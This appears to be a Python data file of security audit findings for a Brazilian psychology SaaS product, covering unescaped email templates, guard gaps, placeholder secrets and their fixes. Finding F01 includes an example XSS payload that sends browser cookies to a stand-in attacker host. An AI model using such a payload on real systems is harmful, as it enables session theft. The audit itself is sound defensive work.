# -*- coding: utf-8 -*-
"""
Dados brutos da auditoria de seguranca do psicoSAAS / UseCognia.
Gerado a partir de 6 auditorias sistematicas (33 controllers backend + frontend
+ segredos hardcoded + XSS), 2026-08-31. Cada achado foi verificado em codigo
real - sem especulacao.
"""

COLORS = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "forte": "#059669",
}

SEV_ORDER = ["critica", "alta", "media", "baixa"]
SEV_LABEL = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa"}

CATEGORIES = {
    1: "Banco sem tranca (isolamento de tenant)",
    2: "Permissão definida no navegador",
    3: "IDOR",
    4: "Chaves expostas",
    5: "Inputs sem tratamento (XSS)",
}

# ---------------------------------------------------------------------------
# ACHADOS
# ---------------------------------------------------------------------------
FINDINGS = [
    {
        "id": "F01",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/email/email.service.ts:387-419 — sendReferralReward e sendReferralWelcomeBonus agora escapam nome/referredName/referrerName com this.escapeHtml() antes de interpolar no HTML.",
        "categoria": 5,
        "severidade": "critica",
        "arquivo": "backend/src/modules/email/email.service.ts:387-419",
        "arquivo2": "backend/src/modules/referral/referral.service.ts:84-88,109-113",
        "titulo": "XSS armazenado/refletido entre contas via e-mail de indicação (referral)",
        "descricao": (
            "sendReferralWelcomeBonus e sendReferralReward interpolam o nome do usuário "
            "diretamente em HTML (`<strong>${referredName}</strong>` / `${master.referrer.name}`) "
            "sem passar por escapeHtml(), diferente de outros templates do mesmo arquivo que já "
            "usam essa função corretamente."
        ),
        "trecho": (
            "// email.service.ts:387-419 (sendReferralWelcomeBonus / sendReferralReward)\n"
            "html: this.wrap(`<p>Olá, ${referredName}! ...</p>` /* sem escapeHtml */)\n\n"
            "// referral.service.ts:84-88\n"
            "await this.email.sendReferralWelcomeBonus(\n"
            "  newUser.name, newUser.email, master.referrer?.name ?? 'um colega'\n"
            ")\n"
            "// referral.service.ts:109-113\n"
            "await this.email.sendReferralReward(\n"
            "  use.referrer.name, use.referrer.email, use.referred?.name ?? 'seu colega'\n"
            ")"
        ),
        "exploracao": (
            "O usuário A define o próprio nome (campo livre de cadastro/perfil) como um payload "
            "HTML malicioso, ex: `<img src=x onerror=fetch('https://atacante.com/?c='+document.cookie)>`. "
            "Quando o usuário B usa o link de indicação de A, B recebe um e-mail com o nome de A "
            "cru. E quando B qualifica a indicação, A recebe um e-mail com o nome de B cru. "
            "Atacante e vítima são CONTAS DIFERENTES — não é self-XSS. O impacto real é limitado "
            "pela sanitização de HTML feita por clientes de e-mail modernos (Gmail/Outlook removem "
            "<script>/onerror na maioria dos casos), mas ainda permite injeção de HTML arbitrário "
            "no corpo do e-mail (phishing visual, links falsos, defacement do template transacional)."
        ),
        "condicoes": "Nenhuma feature flag necessária; basta o atacante ter uma conta e usar o programa de indicação (referral), que está sempre ativo.",
    },
    {
        "id": "F02",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/email/email.service.ts:253-268 — sendBookingRequest agora escapa patientName/date/time com this.escapeHtml(); subject também sanitizado contra quebra de linha.",
        "categoria": 5,
        "severidade": "alta",
        "arquivo": "backend/src/modules/email/email.service.ts:253-268",
        "arquivo2": "backend/src/modules/notifications/notifications.service.ts:1479-1485",
        "titulo": "XSS via nome de paciente não autenticado no e-mail de solicitação de agendamento",
        "descricao": (
            "sendBookingRequest interpola patientName, date e time direto no HTML "
            "(`<strong>${patientName}</strong>`) sem escapeHtml(). booking.patientName vem do "
            "formulário público de agendamento (BookingPage.tsx), preenchido por qualquer "
            "visitante SEM LOGIN."
        ),
        "trecho": (
            "// notifications.service.ts:1479-1484\n"
            "await this.email.sendBookingRequest(\n"
            "  booking.patientName, page.psychologist.email, booking.date, booking.time, confirmUrl\n"
            ")\n\n"
            "// email.service.ts:253-268 (sendBookingRequest)\n"
            "html: this.wrap(`<p>...<strong>${patientName}</strong> solicitou agendamento "
            "para <strong>${date}</strong> às <strong>${time}</strong>...</p>`)"
        ),
        "exploracao": (
            "É a superfície de XSS mais exposta encontrada na auditoria: o atacante NÃO PRECISA "
            "de conta — só precisa agendar um horário público (`/agendar/:slug`) com o campo nome "
            "preenchido com um payload HTML/JS. A vítima é o psicólogo dono da agenda, que recebe "
            "o e-mail de notificação com o payload não escapado."
        ),
        "condicoes": "Exige apenas que o psicólogo tenha a página de agendamento público habilitada (funcionalidade padrão do produto).",
    },
    {
        "id": "F03",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/templates/templates.controller.ts:24-28 — POST /templates agora exige @UseGuards(JwtAuthGuard, CsrfGuard, AdminGuard).",
        "categoria": 2,
        "severidade": "alta",
        "arquivo": "backend/src/modules/templates/templates.controller.ts:24-28",
        "arquivo2": "backend/src/modules/templates/entities/template.entity.ts",
        "titulo": "Criação de template global sem AdminGuard permite envenenar conteúdo servido a outros usuários",
        "descricao": (
            "POST /templates só exige JwtAuthGuard + CsrfGuard (sem AdminGuard). A entidade "
            "Template não tem coluna de tenant (userId/psychologistId) — é uma tabela GLOBAL, "
            "servida a todos os usuários via findAll()/findByType(). CreateTemplateDto aceita "
            "isDefault: boolean livremente."
        ),
        "trecho": (
            "// templates.controller.ts:24-28\n"
            "@Post()\n"
            "@UseGuards(JwtAuthGuard, CsrfGuard)\n"
            "create(@Body() dto: CreateTemplateDto) {\n"
            "  return this.templates.create(dto)\n"
            "}\n\n"
            "// dto/create-template.dto.ts:19-21\n"
            "isDefault?: boolean"
        ),
        "exploracao": (
            "Qualquer conta autenticada (Free ou Pro) pode chamar POST /templates com "
            "type: 'whatsapp_message' (ou document/receipt), isDefault: true e conteúdo "
            "malicioso/phishing. Como o serviço faz upsert de seed apenas em onModuleInit e "
            "findByType() ordena por createdAt ASC, um template malicioso criado pelo atacante "
            "com isDefault:true passa a coexistir com os templates padrão reais e pode ser "
            "servido a OUTROS psicólogos, inserindo conteúdo controlado pelo atacante em "
            "documentos/recibos/mensagens de WhatsApp que outros profissionais enviam a seus "
            "próprios pacientes."
        ),
        "condicoes": "Nenhuma condição especial — qualquer conta autenticada, mesmo plano Free.",
    },
    {
        "id": "F04",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/email/email.service.ts:280-283 — ramo padrão de sendBookingConfirmation agora escapa patientName/date/time.",
        "categoria": 5,
        "severidade": "media",
        "arquivo": "backend/src/modules/email/email.service.ts:280-283",
        "titulo": "sendBookingConfirmation — ramo padrão (sem mensagem customizada) sem escape de HTML",
        "descricao": (
            "Apenas o ramo customMessage (texto digitado pelo psicólogo) passa por escapeHtml() "
            "(linha 279). O ramo padrão interpola patientName/date/time crus."
        ),
        "trecho": (
            "// email.service.ts:280-283\n"
            ": `<p>Olá, ${patientName.split(' ')[0]}! Sua sessão para <strong>${date}</strong> "
            "às <strong>${time}</strong> foi confirmada.</p>`"
        ),
        "exploracao": (
            "No fluxo típico (paciente agenda e recebe seu próprio e-mail) é self-XSS de baixo "
            "impacto. Se um profissional cria o agendamento manualmente em nome de um paciente, "
            "passa a ser cross-user — o profissional (ou um paciente que ditou o nome por telefone) "
            "poderia injetar HTML que é enviado por e-mail a outra pessoa."
        ),
        "condicoes": "Requer o fluxo de agendamento manual pelo profissional (em nome do paciente) para virar cross-user.",
    },
    {
        "id": "F05",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/main.ts — nova checagem KNOWN_SECRET_PLACEHOLDERS rejeita o boot se JWT_SECRET/SIGN_SECRET/ENCRYPTION_KEY forem iguais aos valores de exemplo do .env.example.",
        "categoria": 4,
        "severidade": "media",
        "arquivo": "backend/src/main.ts:25-33",
        "arquivo2": "backend/.env.example:16,23,77",
        "titulo": "Validação de startup checa só o comprimento de JWT_SECRET/SIGN_SECRET/ENCRYPTION_KEY, não se é o valor-placeholder",
        "descricao": (
            "main.ts rejeita o boot se esses segredos tiverem menos de 32 caracteres — mas os "
            "placeholders do .env.example já têm mais de 32 caracteres "
            "('your-super-secret-jwt-key-change-in-production-min-32-chars', etc.), então passam "
            "na validação de comprimento sem serem trocados."
        ),
        "trecho": (
            "// backend/.env.example:16\n"
            "JWT_SECRET=your-super-secret-jwt-key-change-in-production-min-32-chars\n"
            "// backend/.env.example:23\n"
            "SIGN_SECRET=your-sign-secret-key-change-in-production-min-32-chars\n"
            "// backend/.env.example:77\n"
            "ENCRYPTION_KEY=change-this-encryption-secret-min-32-chars"
        ),
        "exploracao": (
            "Se alguém copiar .env.example para .env em produção sem trocar os valores, o boot "
            "passa normalmente com um segredo previsível e PÚBLICO (está no repositório git). "
            "Um atacante que leia o .env.example forjaria JWTs válidos, assinaturas de documento "
            "e leria dados 'criptografados' com a chave conhecida."
        ),
        "condicoes": "Exige erro operacional de deploy (não trocar os placeholders) — não é um bug de código isolado, mas a validação atual não detecta esse erro.",
    },
    {
        "id": "F06",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/common/guards/admin.guard.ts:4 — fallback hardcoded removido (getAdminEmails() agora retorna [] se ADMIN_EMAILS ausente); main.ts passou a exigir ADMIN_EMAILS em produção.",
        "categoria": 4,
        "severidade": "baixa",
        "arquivo": "backend/src/common/guards/admin.guard.ts:4",
        "arquivo2": "backend/src/modules/billing/billing.controller.ts:128",
        "titulo": "E-mail de admin hardcoded como fallback caso ADMIN_EMAILS não esteja definida",
        "descricao": "`process.env.ADMIN_EMAILS ?? 'gilsonfilho96@outlook.com'` concede privilégio de admin automaticamente a esse e-mail se a env var não for configurada em produção.",
        "trecho": "const admins = (process.env.ADMIN_EMAILS ?? 'gilsonfilho96@outlook.com')\n  .split(',').map(v => v.trim().toLowerCase()).filter(Boolean)",
        "exploracao": "Baixo risco por si só (exige controle daquela conta de e-mail específica), mas é um default que concede privilégio administrativo silenciosamente se a env var for esquecida no deploy.",
        "condicoes": "Só é explorável se ADMIN_EMAILS não for configurada em produção E o atacante controlar aquele e-mail específico.",
    },
    {
        "id": "F07",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/prospecting/webhooks/prospecting-webhook.controller.ts:29 — comparação trocada para secretsMatch() (SHA-256 + timingSafeEqual), mesmo helper usado no webhook do Asaas.",
        "categoria": 3,
        "severidade": "media",
        "arquivo": "backend/src/modules/prospecting/webhooks/prospecting-webhook.controller.ts:29",
        "titulo": "Comparação de token do webhook de prospecção não é em tempo constante",
        "descricao": "Usa `token !== expectedSecret` (comparação de string simples) em vez de crypto.timingSafeEqual, diferente do webhook do WhatsApp Cloud que usa comparação timing-safe corretamente no mesmo repositório.",
        "trecho": "// prospecting-webhook.controller.ts:29\nif (token !== expectedSecret) {",
        "exploracao": "Permite teoricamente um ataque de timing para recuperar PROSPECTING_WEBHOOK_SECRET byte a byte, embora a viabilidade prática dependa de jitter de rede/infra (risco baixo-médio em produção real, mas é o tipo de desvio de padrão que deve ser corrigido, já que o padrão correto já existe em outro lugar do mesmo código).",
        "condicoes": "Exige medição de latência de rede precisa e repetida contra o endpoint do webhook — ataque de alta sofisticação, baixa probabilidade prática.",
    },
    {
        "id": "F08",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/email/email.service.ts:456-492 — sendDocumentEmail agora escapa recipientName/docTitle/psychologistName/psychologistCrp/signCode.",
        "categoria": 5,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/email/email.service.ts:456-492",
        "arquivo2": "backend/src/modules/documents/documents.service.ts:405-414",
        "titulo": "sendDocumentEmail interpola recipientName/docTitle/psychologistName sem escape",
        "descricao": "Nenhum dos três campos passa por escapeHtml() antes de compor o HTML do e-mail de envio de documento.",
        "trecho": "html: this.wrap(`<p>Olá, ${opts.recipientName}. Segue em anexo o documento "
        "<strong>${opts.docTitle}</strong>, emitido por <strong>${opts.psychologistName}</strong> ...`)",
        "exploracao": "Todos os campos são definidos pelo profissional (não pelo paciente) e o e-mail vai para o paciente — é cross-user, mas exige que o próprio profissional injete o payload contra seu próprio paciente (motivação de ataque baixa, mas ainda uma falha de tratamento de input a corrigir por defesa em profundidade).",
        "condicoes": "Requer que o profissional (não o paciente) seja o atacante — cenário de baixa probabilidade.",
    },
    {
        "id": "F09",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/email/email.service.ts:183-385 — sendWelcome/sendPasswordReset/sendEmailVerification/sendTrialEndingReminder agora escapam o primeiro nome antes de interpolar.",
        "categoria": 5,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/email/email.service.ts:189,215,238,375",
        "titulo": "sendWelcome / sendPasswordReset / sendEmailVerification / sendTrialEndingReminder sem escapeHtml (self-XSS)",
        "descricao": "Usam name/firstName sem escapeHtml(). Em todos os casos o destinatário do e-mail é o próprio dono do nome.",
        "trecho": "// e.g. email.service.ts:189 (sendWelcome)\nhtml: this.wrap(`<p>Olá, ${name}! Bem-vindo...</p>`)",
        "exploracao": "Impacto restrito ao próprio atacante (self-XSS) — o usuário só conseguiria injetar HTML no e-mail que ele mesmo recebe. Severidade baixa, mas vale corrigir por consistência e defesa em profundidade.",
        "condicoes": "Nenhuma — mas o único impacto é contra o próprio atacante.",
    },
    {
        "id": "F10",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/booking/booking.service.ts:498-506,960-983 — confirmado via migration ProtectPublicTokensAndSensitiveLogs1784590000000 que 100% dos registros já foram migrados para hash; fallback de comparação em texto puro removido.",
        "categoria": 1,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/booking/booking.service.ts:499-503,960-979",
        "titulo": "Fallback de comparação de confirmationToken em texto puro (legado)",
        "descricao": "confirmByToken e findByCancellationToken comparam tanto o hash do token quanto o texto puro, mantendo compatibilidade com registros antigos que armazenaram o token sem hash antes da migração.",
        "trecho": "where: [\n  { confirmationToken: hashToken(token) },\n  { confirmationToken: token },\n]",
        "exploracao": "Não é explorável contra dados novos (todo booking novo grava hashToken()). É uma superfície residual: se algum registro legado ainda tiver o token em claro, um vazamento de backup/dump do banco exporia o segredo diretamente comparável.",
        "condicoes": "Só relevante se ainda existirem linhas antigas com token em texto puro no banco de produção.",
    },
    {
        "id": "F11",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/documents/documents.service.ts:56-67 — signCode aumentado de 8 para 14 hex chars (32→56 bits); fallback de colisão também ampliado (randomBytes(4)→randomBytes(7)).",
        "categoria": 1,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/documents/documents.service.ts:56-67",
        "titulo": "signCode de verificação de documento usa apenas 32 bits de entropia",
        "descricao": "signCode usa somente 8 caracteres hex (fullHash.slice(0,8)) do HMAC — 32 bits de espaço de busca.",
        "trecho": "// documents.service.ts:56-67\nconst signCode = fullHash.slice(0, 8) // 32 bits",
        "exploracao": "A rota pública GET /documents/verify/:code é rate-limited a 30/min, tornando força bruta impraticável em tempo humano (~272 anos no ritmo permitido por IP), mas o espaço de busca é pequeno o suficiente para justificar reforço (12-16 hex chars) caso o rate limit seja contornável via múltiplos IPs/proxies.",
        "condicoes": "Exige contornar o rate-limit por IP (ex: via botnet ou proxies rotativos) para se tornar praticável.",
    },
    {
        "id": "F12",
        "status": "ja_correto",
        "correcao_aplicada": "backend/src/modules/testimonial/testimonial.service.ts:165-170 — setApproved já rejeitava approvedForPublic:true sem publicConsent (BadRequestException). O achado do auditor considerou só o controller; nenhuma alteração de código foi necessária.",
        "categoria": 2,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/testimonial/testimonial.controller.ts:44-51",
        "titulo": "setApproved não valida publicConsent no backend, só no frontend (risco de compliance/LGPD)",
        "descricao": "A regra 'só aprovar depoimento público se o usuário deu consentimento' existe apenas como botão disabled no frontend (TestimonialsPage.tsx:44). O backend não impõe a mesma checagem.",
        "trecho": "// testimonial.controller.ts:44-51\n@Patch('admin/testimonials/:id')\n@UseGuards(JwtAuthGuard, CsrfGuard, AdminGuard)\nsetApproved(@Param('id') id: string, @Body() dto: SetApprovedDto) { ... }",
        "exploracao": "Não é uma escalação de privilégio (a rota já exige AdminGuard, então só um admin já confiável alcança o endpoint) — é um risco de compliance/LGPD: um admin ou script que chame a rota diretamente poderia publicar um depoimento sem o consentimento explícito do usuário, já que a checagem de negócio não existe no backend.",
        "condicoes": "Requer já ter acesso de admin — não é explorável por usuário comum.",
    },
    {
        "id": "F13",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/auth/auth.service.ts — updatePreferences agora usa PlanAccessService para descartar autoCharge/lateReminder/chargeTemplate/lateReminderTemplate quando a conta não tem plano Pro, em vez de persistir preferências sem efeito.",
        "categoria": 2,
        "severidade": "baixa",
        "arquivo": "backend/src/modules/auth/auth.controller.ts:224-229",
        "titulo": "PATCH /auth/preferences não exige @RequirePlan('pro') para campos de cobrança automática",
        "descricao": "Um usuário Free pode gravar autoCharge:true, lateReminder:true, chargeTemplate, pixKey via chamada direta, mesmo com a UI desabilitando esses campos só client-side (PaymentTab.tsx).",
        "trecho": "// auth.controller.ts:224-229\n@Patch('preferences')\n@UseGuards(JwtAuthGuard, NoImpersonationGuard)\nupdatePreferences(@Request() req, @Body() dto: UpdatePreferencesDto) { ... }",
        "exploracao": "Não há impacto prático: toda ação que efetivamente ENVIA a cobrança (booking upfront charge, lembrete de atraso, sendCharge) converge para NotificationsService.sendWhatsApp(), que chama canUseWhatsAppAutomation() → planAccess.hasAccess(userId,'pro') e bloqueia contas Free no ponto de execução real. É um achado de design/defesa-em-profundidade: se um novo canal de disparo no futuro esquecer de checar canUseWhatsAppAutomation, a trava desaparece silenciosamente porque a preferência gravada não reflete o plano real.",
        "condicoes": "Não explorável hoje — depende de uma falha futura em não checar o plano no ponto de disparo.",
    },
    {
        "id": "F14",
        "status": "corrigido",
        "correcao_aplicada": "backend/src/modules/billing/billing.controller.ts:100-107 — GET /billing/metrics agora usa @UseGuards(JwtAuthGuard, AdminGuard); isMetricsAdmin() duplicado foi removido.",
        "categoria": 2,
        "severidade": "informativa",
        "arquivo": "backend/src/modules/billing/billing.controller.ts:100-107,127-133",
        "titulo": "GET /billing/metrics reimplementa checagem de admin em vez de reusar AdminGuard",
        "descricao": "isMetricsAdmin() lê a mesma env var ADMIN_EMAILS de forma independente do AdminGuard, em vez de usar @UseGuards(JwtAuthGuard, AdminGuard).",
        "trecho": "private isMetricsAdmin(email?: string): boolean {\n  const admins = (process.env.ADMIN_EMAILS ?? 'gilsonfilho96@outlook.com')\n    .split(',').map(v => v.trim().toLowerCase()).filter(Boolean)\n  return !!email && admins.includes(email.toLowerCase())\n}",
        "exploracao": "Não é uma vulnerabilidade — hoje é funcionalmente equivalente ao AdminGuard. Risco de manutenção: se o AdminGuard for endurecido no futuro (MFA, allowlist de IP), essa rota não herda a mudança automaticamente.",
        "condicoes": "N/A — achado de manutenibilidade, não de segurança ativa.",
    },
]

# ---------------------------------------------------------------------------
# PONTOS FORTES (evidencia de cobertura da auditoria)
# ---------------------------------------------------------------------------
STRENGTHS = [
    ("Isolamento de tenant sistemático", "analytics.service.ts:71-302", "Todas as 17 queries paralelas do dashboard filtram psychologistId = :userId vindo do JWT."),
    ("Isolamento de tenant sistemático", "appointments.service.ts:70-77", "findOne usa where:{id,psychologistId}; retorna 404 (não 403) para registros de outro psicólogo, evitando enumeração."),
    ("Isolamento de tenant sistemático", "patients.service.ts / sessions.service.ts", "Todo findRaw/findAll/update/delete cruza id com psychologistId — inclusive em cascatas (anexos, revisões, addenda)."),
    ("Isolamento de tenant sistemático", "financial.service.ts:188-251", "markPaid, remove, updateRecurringExpense sempre chamam findOne(id, psychologistId) antes de mutar."),
    ("Isolamento de tenant sistemático", "neuropsych-assessments.service.ts", "Todos os métodos (8 pontos verificados) usam where:{id,psychologistId}, inclusive assertInstrument para vínculo de recursos filhos."),
    ("IDOR eliminado por design", "auth.service.ts", "updateProfile/updateAvatar/updatePreferences/changePassword/deleteAccount usam exclusivamente req.user.id (JWT sub) — nunca um id vindo do cliente."),
    ("IDOR eliminado por design", "data-export.service.ts:49-112", "Todas as 13 entidades exportadas são filtradas por userId; rate-limit de 3/hora com log de auditoria que exclui o conteúdo exportado."),
    ("Tokens públicos bem implementados", "patients.service.ts:406-428 / neuropsych-assessments.service.ts:208-231", "Tokens de portal/compartilhamento: 32 bytes de entropia, hasheados (hashToken) — nunca comparados em texto puro —, com TTL configurável e expiração aplicada em código (não só documentada)."),
    ("Tokens públicos bem implementados", "instrument-assignments.service.ts:183-229 / booking-contact-memory.service.ts:37-53", "Mesmo padrão: token opaco hasheado + expiração checada em código + throttle na rota pública."),
    ("Webhooks assinados corretamente", "whatsapp-cloud-webhook.controller.ts:52-63", "HMAC-SHA256 sobre o rawBody, comparação com crypto.timingSafeEqual e checagem de comprimento antes da comparação (evita exceção por tamanhos diferentes)."),
    ("Webhooks assinados corretamente", "billing-webhook.service.ts:28-39 / encrypt.util.ts:163-168", "isValidOrigin usa secretsMatch (SHA-256 + timingSafeEqual), falha fechado se ASAAS_WEBHOOK_TOKEN não estiver configurado."),
    ("Webhooks assinados corretamente", "google-calendar.service.ts:319-335", "State do fluxo OAuth assinado com HMAC-SHA256, expiração de 10 min, comparação timing-safe."),
    ("Guards administrativos aplicados a nível de classe", "admin.controller.ts / churn.controller.ts / prospecting.controller.ts", "@UseGuards(JwtAuthGuard, CsrfGuard, AdminGuard) na classe inteira — nenhum handler individual depende de lembrar de aplicar o guard."),
    ("Guard de impersonação com boa cobertura", "no-impersonation.guard.ts + 10+ controllers", "NoImpersonationGuard bloqueia ações sensíveis (senha, billing, financeiro, exportação, analytics) durante sessão de 'ver como usuário', sem exceção identificada."),
    ("Impersonação bem desenhada", "auth.controller.ts:165-167 / auth.service.ts:306-346", "Exige AdminGuard, bloqueia impersonar outro admin, emite apenas access token de 15 min (nunca toca no refresh token do alvo)."),
    ("Rota interna protegida por segredo compartilhado", "internal-cleanup.controller.ts:18-28", "Pública mas exige header x-internal-secret comparado via secretsMatch timing-safe, falha fechado sem o segredo configurado, rate-limited a 3/hora."),
    ("Validação de startup fail-closed", "backend/src/main.ts:19-39", "Boot falha (throw) se JWT_SECRET, DATABASE_URL, SIGN_SECRET ou ENCRYPTION_KEY estiverem ausentes ou curtos, e se TYPEORM_SYNC=true ou ASAAS_WEBHOOK_TOKEN ausente em produção."),
    ("Sem defaults inseguros em criptografia", "encrypt.util.ts", "getKey() lança erro se ENCRYPTION_KEY ausente/curta — sem fallback silencioso para dado clínico criptografado em repouso."),
    ("CI com scanner de segredos", ".github/workflows/ci.yml", "Gitleaks roda em todo push/PR com histórico completo (fetch-depth:0) — scanner automatizado já integrado ao pipeline."),
    ("Sem segredos reais no histórico git", "git log -S (AKIA, BEGIN RSA, sk_live)", "Buscas direcionadas no histórico completo não encontraram credenciais reais — apenas exemplos de documentação e artefatos de bibliotecas de terceiros já removidos."),
    ("Bundle do frontend limpo", "frontend/dist/assets/*.js", "Nenhuma chave de backend vazou via VITE_*; apenas VITE_POSTHOG_KEY (chave pública de analytics, uso client-side esperado)."),
    ("Sem XSS via renderização de HTML no frontend", "frontend/src (grep exaustivo)", "Nenhum dangerouslySetInnerHTML em todo o frontend; nenhuma lib de Markdown com HTML habilitado; nenhum eval/new Function/setTimeout com string."),
    ("Texto de IA renderizado com segurança", "NeuropsychCopilotPanel.tsx:264-309", "Saída do Copiloto Clínico (IA) renderizada 100% via JSX puro — escapada automaticamente pelo React."),
    ("Maioria dos templates de e-mail já escapa corretamente", "email.service.ts (sendBookingCancellation, sendSessionReminder, sendProUpgradeOffer)", "Usam this.escapeHtml() corretamente em todos os campos de usuário antes de interpolar no HTML — mostra que o padrão correto já é conhecido e aplicado na maioria dos casos."),
    ("Upload de anexos validado por conteúdo real", "patient-attachments.service.ts:172-185", "contentMatchesMime valida magic bytes do arquivo, não apenas o MIME declarado; storageKey derivado 100% server-side, sem risco de path traversal."),
    ("Import CSV não permite spoofing de dono", "patients-import.service.ts:157", "psychologistId sempre fixado a partir do usuário autenticado — nenhum campo do CSV pode sobrescrever o dono dos registros importados."),
    ("Prontuário clínico com trilha de integridade", "sessions.service.ts:358-387", "Bloqueio de edição direta após 7 dias (EDIT_LOCK_DAYS) com trilha de revisões e hash HMAC de integridade do conteúdo clínico."),
]

# ---------------------------------------------------------------------------
# RECOMENDACOES PRIORIZADAS
# ---------------------------------------------------------------------------
RECOMMENDATIONS = [
    ("P1", "Aplicar escapeHtml() em todos os templates de e-mail que interpolam dado de usuário sem escape", "F01, F02, F04, F08, F09", "Elimina o único achado crítico e o único de alta severidade que envolvem contas/visitantes diferentes (F01, F02); a técnica (escapeHtml) já existe e está em uso no mesmo arquivo, então é aplicação mecânica."),
    ("P1", "Adicionar AdminGuard em POST /templates (ou mover isDefault para rota admin-only)", "F03", "Fecha o único achado de alta severidade de permissão — hoje qualquer conta pode envenenar conteúdo servido a outros psicólogos."),
    ("P2", "Endurecer a validação de startup para rejeitar os valores-placeholder conhecidos do .env.example, não só o comprimento", "F05", "Reduz o risco de um erro operacional de deploy (copiar .env.example sem editar) resultar em segredos previsíveis e públicos em produção."),
    ("P2", "Trocar comparação de token do webhook de prospecção para crypto.timingSafeEqual", "F07", "Alinha com o padrão já usado no webhook do WhatsApp Cloud no mesmo repositório — mudança de poucas linhas."),
    ("P2", "Adicionar checagem de publicConsent no backend de setApproved (testimonial)", "F12", "Fecha lacuna de compliance/LGPD; a regra de negócio já existe no frontend, só precisa ser espelhada no backend."),
    ("P3", "Remover o e-mail hardcoded de fallback em ADMIN_EMAILS e falhar o boot se a env var estiver ausente", "F06", "Elimina o default implícito de privilégio administrativo — alinhado ao padrão fail-closed já usado para outros segredos em main.ts."),
    ("P3", "Aumentar a entropia do signCode de verificação de documento (8 → 12-16 hex chars)", "F11", "Reforço defensivo de baixo custo contra cenários futuros de rate-limit bypass."),
    ("P3", "Adicionar @RequirePlan('pro') em PATCH /auth/preferences para os campos de cobrança automática", "F13", "Defesa em profundidade — remove a dependência implícita de que todo canal de disparo futuro lembre de checar o plano."),
    ("P3", "Remover fallback de comparação de confirmationToken em texto puro após confirmar que não há registros legados", "F10", "Reduz superfície de exposição em caso de vazamento de backup do banco."),
    ("P3", "Consolidar isMetricsAdmin() em billing.controller.ts para reusar AdminGuard em vez de duplicar a lógica", "F14", "Reduz risco de a rota /billing/metrics não herdar futuros endurecimentos do AdminGuard."),
]
